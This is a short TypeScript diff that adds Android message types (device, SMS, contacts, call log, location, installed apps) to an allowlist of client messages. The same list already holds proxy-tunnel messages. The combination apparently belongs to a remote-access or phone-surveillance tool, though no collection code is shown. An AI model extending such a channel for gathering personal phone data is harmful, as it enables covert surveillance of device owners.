@@ -36,6 +36,12 @@ export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "proxy_data",
   "proxy_close",
   "disconnect_info",
+  "android_device",
+  "android_sms",
+  "android_contacts",
+  "android_calllog",
+  "android_location",
+  "android_apps",
 ]);
 
 export function isAllowedClientMessageType(type: string): boolean {
